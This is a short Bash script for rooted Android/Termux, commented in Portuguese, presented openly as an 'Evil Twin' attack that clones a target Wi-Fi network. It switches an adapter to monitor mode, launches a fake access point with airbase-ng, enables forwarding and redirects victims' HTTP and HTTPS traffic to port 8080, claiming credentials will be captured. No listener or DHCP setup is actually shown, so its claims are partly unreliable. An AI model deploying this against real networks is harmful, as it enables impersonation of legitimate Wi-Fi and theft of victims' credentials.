#!/data/data/com.termux/files/usr/bin/bash
# ============================================
# Ataque Evil Twin - clona rede e captura credenciais
# Requer: root + adaptador USB Wi-Fi externo (modo monitor)
# Uso: ./evil_twin.sh <SSID_ALVO> <CANAL>
# ============================================

SSID="${1:-}"
CANAL="${2:-6}"
INTERFACE="${3:-wlan1}"  # Interface externa em modo monitor

if [[ -z "$SSID" ]]; then
    echo "[!] Uso: ./evil_twin.sh <SSID_ALVO> <CANAL> [INTERFACE]"
    exit 1
fi

echo "[*] Verificando root..."
if ! command -v tsu &> /dev/null; then
    echo "[!] Root necessário."
    exit 1
fi

echo "[*] Verificando interface $INTERFACE..."
if ! tsu -c "iw dev $INTERFACE info" &> /dev/null; then
    echo "[!] Interface $INTERFACE não encontrada."
    echo "[!] Conecte um adaptador USB Wi-Fi externo."
    exit 1
fi

echo "[*] Colocando $INTERFACE em modo monitor..."
tsu -c "
ip link set $INTERFACE down &&
iw dev $INTERFACE set type monitor &&
ip link set $INTERFACE up &&
echo '[+] Modo monitor ativado'
"

echo "[*] Criando AP falso '$SSID' no canal $CANAL..."
tsu -c "
airbase-ng -e '$SSID' -c $CANAL $INTERFACE &
sleep 2 &&
echo '[+] AP falso criado'
"

echo "[*] Configurando DHCP e redirecionamento..."
tsu -c "
echo '1' > /proc/sys/net/ipv4/ip_forward &&
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080 &&
iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080 &&
echo '[+] Redirecionamento configurado'
"

echo ""
echo "[*] AP falso '$SSID' ativo no canal $CANAL."
echo "[*] Quando a vítima se conectar, as credenciais serão capturadas."
echo "[*] Pressione Ctrl+C para parar."

# Mantém o script rodando até Ctrl+C
trap 'tsu -c "
iptables -t nat -F &&
kill %1 2>/dev/null" ; echo "[+] Limpeza concluída"' EXIT

while true; do sleep 60; done
